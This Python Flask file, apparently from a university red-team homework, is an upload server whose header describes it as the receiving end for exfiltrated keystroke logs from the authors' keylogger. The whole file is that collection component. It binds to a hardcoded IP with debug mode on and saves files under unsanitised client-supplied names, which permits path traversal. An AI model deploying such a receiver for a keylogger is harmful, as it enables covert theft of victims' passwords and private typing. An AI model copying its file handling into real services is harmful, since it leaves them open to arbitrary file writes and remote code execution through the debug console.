# gdk7676@rit.edu & jmb7438@rit.edu
# Geoff Kanteles and Jake Brown - Homework 3: Red Team Tool
# Flask server for uploading files - meant to take the log file
# from our keylogger for exfil of logged keystrokes

import os
from flask import Flask, render_template, request

app = Flask(__name__)

APP_ROOT = os.path.dirname(os.path.abspath(__file__))

@app.route("/", methods=['GET', 'POST'])
def upload():
    target = os.path.join(APP_ROOT, 'recv/')
    print(target)

    if not os.path.isdir(target):
        os.mkdir(target)

    if request.method == 'POST':
        #for key, value in request.files:
        #    print(key, value)
        print(request.files)
        print(request.data)
        file = request.files['file']
        if file.filename == '':
            print("No selected file!")
            return render_template("upload.html")
        if file:
            destination = "/".join([target, file.filename])
            file.save(destination)

            return render_template("complete.html")
    return '''
    <!doctype html>
    <title>Upload new File</title>
    <h1>Upload new File</h1>
    <form method=post enctype=multipart/form-data>
      <input type=file name=file>
      <input type=submit value=Upload>
    </form>
    '''

if __name__ == '__main__':
    app.run(host='129.21.157.241',port=5000,debug=True)
